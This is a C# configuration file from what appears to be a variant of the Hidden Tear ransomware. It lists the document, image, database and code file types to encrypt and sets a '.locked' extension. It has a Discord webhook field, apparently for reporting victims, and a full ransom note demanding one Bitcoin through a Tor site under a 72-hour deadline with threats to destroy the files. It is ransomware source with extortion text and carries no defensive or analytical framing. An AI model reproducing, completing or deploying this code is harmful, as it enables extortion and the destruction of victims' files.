using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace hidden_tear.Tools
{
    internal class Config
    {
        public static string[] extensionToEncrypt = new string[]{ ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".pdf", ".sqlite3", ".db" };
        public static string DiscordWebhook = "";
        public static string encryptedExtension = ".locked";
        public static string userName = Environment.UserName;
        public static string computerName = System.Environment.MachineName.ToString();
        public static string userDir = "C:\\Users\\";
        public static string mutex = "dsdoskdosk837928hduijfh";
        public static string days, hours, minutes, secs;
        public static int year = DateTime.Now.Year, month = DateTime.Now.Month, day = 1;


        public static string note = "Your Files Have Been Encrypted!\r\n\r\nWhat Happened to My Files?\r\nAll your important files (documents, photos, videos, databases, and other files) have been encrypted using a strong encryption algorithm. You are unable to access these files as they have been transformed into unreadable content.\r\n\r\nHow Can I Recover My Files?\r\nThe only way to recover your files is by purchasing a unique decryption key from us. Without this key, your files are lost forever.\r\n\r\nHow to Obtain the Decryption Key?\r\nDownload Tor Browser: Visit https://www.torproject.org and download the Tor Browser.\r\nAccess Our Decryption Service: Open Tor Browser and navigate to our special decryption service website: http://exampleonionaddress.onion\r\nFollow the Instructions: On our website, you will find detailed instructions on how to make the payment and retrieve your decryption key.\r\n\nWhat is the Payment Amount?\r\nThe payment amount is 1 Bitcoin (BTC). Due to the anonymous nature of Bitcoin, this is the only accepted form of payment.\r\n\r\nHow to Buy Bitcoin?\r\nVisit a Bitcoin Exchange: Some popular exchanges are Coinbase, Binance, and Kraken.\r\n\r\nCreate an Account and Buy Bitcoin: Follow the instructions on the exchange to buy Bitcoin.\r\n\r\nTransfer Bitcoin to Our Wallet: Send 1 BTC to the following address:\r\n\r\n1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\r\n\r\nWhat Happens After Payment?\r\nOnce we receive the payment, you will automatically receive the decryption key and decryption software. Follow the provided instructions to decrypt your files.\r\n\r\nDeadline and Important Information\r\nDeadline: You have 72 hours to complete the payment. After this period, the decryption key will be destroyed, and your files will be lost forever.\r\nContact Us: If you encounter any issues, you can contact us on the decryption service website. We offer free decryption of 1 file as proof of our ability to decrypt your files.\r\nWarning\r\nDo not attempt to decrypt your files using third-party software as it may cause irreversible damage.\r\nDo not rename or modify the encrypted files.\r\nAny attempts to remove the ransomware will result in the immediate destruction of your files.";

        public static string[] WALLPAPER =
        {
            "Hidden Tear Ransomware",
            "Your files have been infected and stolen",
            "Follow the instructions"
        };
    }
}